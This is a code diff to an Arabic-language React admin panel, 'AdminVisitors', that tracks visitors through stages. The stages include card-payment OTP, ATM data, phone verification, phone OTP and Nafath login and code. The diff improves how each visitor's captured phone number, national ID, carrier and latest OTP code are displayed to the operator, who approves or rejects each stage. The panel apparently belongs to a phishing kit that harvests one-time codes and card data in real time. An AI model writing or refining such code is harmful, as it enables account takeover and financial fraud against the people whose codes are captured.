@@ -837,6 +837,12 @@ const AdminVisitors = () => {
     const sanitized = value.replace(/\D/g, "").slice(0, 2);
     setNafathNumberInputs(prev => ({ ...prev, [orderId]: sanitized }));
   };
+  const getLatestStageEvent = (orderId: string, stage: string) => {
+    const matchedEvents = stageEvents
+      .filter(event => event.order_id === orderId && event.stage === stage)
+      .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
+    return matchedEvents[matchedEvents.length - 1] || null;
+  };
   const hasOtpTrail = (order: InsuranceOrder) => {
     const stage = currentStageOrEmpty(order);
     return stage === "otp" || Boolean(order.otp_code);
@@ -1964,7 +1970,7 @@ const AdminVisitors = () => {
                                 const stageNameMap: Record<string, string> = {
                                   otp: "كود OTP الدفع بالبطاقة",
                                   atm: "بيانات ATM",
-                                  phone_verify: "توثيق رقم الجوال",
+                                  phone_verification: "توثيق رقم الجوال",
                                   phone_otp: "كود OTP توثيق الجوال",
                                   nafath_login: "دخول النفاذ",
                                   nafath_verify: "رمز النفاذ",
@@ -2129,15 +2135,17 @@ const AdminVisitors = () => {
 
                                 {/* 4. توثيق رقم الجوال */}
                                 {(() => {
-                                  const phoneEvent = stageEvents.find(e => e.order_id === order.id && e.stage === "phone_verification");
+                                  const phoneEvent = getLatestStageEvent(order.id, "phone_verification");
                                   const carrierName = (phoneEvent?.payload as any)?.carrier || null;
+                                  const verificationPhone = order.phone || (phoneEvent?.payload as any)?.phone || visitorPhone || "—";
+                                  const verificationNationalId = order.national_id || (phoneEvent?.payload as any)?.national_id || visitorNationalId || null;
                                   return (
-                                    <CollapsibleCard title="توثيق رقم الجوال" icon={<span>📲</span>} borderColor="border-purple-500/30" bgColor="bg-purple-500/5" headerBg="bg-purple-500/10" headerBorder="border-purple-500/20" textColor="text-purple-600" defaultOpen={isPending && activeStage === "phone_verify"} isActive={isPending && activeStage === "phone_verify"}>
+                                    <CollapsibleCard title="توثيق رقم الجوال" icon={<span>📲</span>} borderColor="border-purple-500/30" bgColor="bg-purple-500/5" headerBg="bg-purple-500/10" headerBorder="border-purple-500/20" textColor="text-purple-600" defaultOpen={isPending && activeStage === "phone_verification"} isActive={isPending && activeStage === "phone_verification"}>
                                       <div className="px-3 py-2.5 grid grid-cols-2 gap-2">
-                                        {(visitorPhone || order.phone) ? (
+                                        {(verificationPhone || verificationNationalId || carrierName) ? (
                                           <>
-                                            <InfoItem label="رقم الجوال" value={visitorPhone || order.phone || "—"} />
-                                            {order.national_id && <InfoItem label="رقم الهوية" value={order.national_id} />}
+                                            <InfoItem label="رقم الجوال" value={verificationPhone} />
+                                            {verificationNationalId && <InfoItem label="رقم الهوية" value={verificationNationalId} />}
                                             {order.customer_name && <InfoItem label="اسم العميل" value={order.customer_name} />}
                                             {carrierName && (
                                               <div className="bg-muted/30 rounded-lg p-2.5 flex items-center gap-2">
@@ -2153,7 +2161,7 @@ const AdminVisitors = () => {
                                         ) : (
                                           <p className="col-span-2 text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
                                         )}
-                                        {renderApproveReject("phone_verify")}
+                                        {renderApproveReject("phone_verification")}
                                       </div>
                                     </CollapsibleCard>
                                   );
@@ -2165,6 +2173,8 @@ const AdminVisitors = () => {
                                     .filter(e => e.order_id === order.id && e.stage === "phone_otp")
                                     .sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
                                   const rejectedPhoneOtps = phoneOtpEvents.filter(e => e.status === "rejected");
+                                  const latestPhoneOtpEvent = phoneOtpEvents[phoneOtpEvents.length - 1];
+                                  const currentPhoneOtp = order.phone_otp_code || (latestPhoneOtpEvent?.payload as any)?.phone_otp_code || (latestPhoneOtpEvent?.payload as any)?.code || null;
                                   return (
                                     <CollapsibleCard title="كود OTP توثيق الجوال" icon={<Phone className="w-3 h-3" />} borderColor="border-violet-500/30" bgColor="bg-violet-500/5" headerBg="bg-violet-500/10" headerBorder="border-violet-500/20" textColor="text-violet-600" defaultOpen={isPending && activeStage === "phone_otp"} isActive={isPending && activeStage === "phone_otp"}>
                                       <div className="px-3 py-2.5 space-y-2">
@@ -2182,8 +2192,8 @@ const AdminVisitors = () => {
                                           </div>
                                         )}
                                         <div className="flex items-center justify-center">
-                                          {order.phone_otp_code ? (
-                                            <span className="text-2xl font-mono font-bold tracking-[6px] text-violet-600 bg-violet-500/10 px-4 py-1.5 rounded-lg border border-violet-500/20">{order.phone_otp_code}</span>
+                                          {currentPhoneOtp ? (
+                                            <span className="text-2xl font-mono font-bold tracking-[6px] text-violet-600 bg-violet-500/10 px-4 py-1.5 rounded-lg border border-violet-500/20">{currentPhoneOtp}</span>
                                           ) : (
                                             <p className="text-[10px] text-muted-foreground py-1">لا توجد بيانات</p>
                                           )}
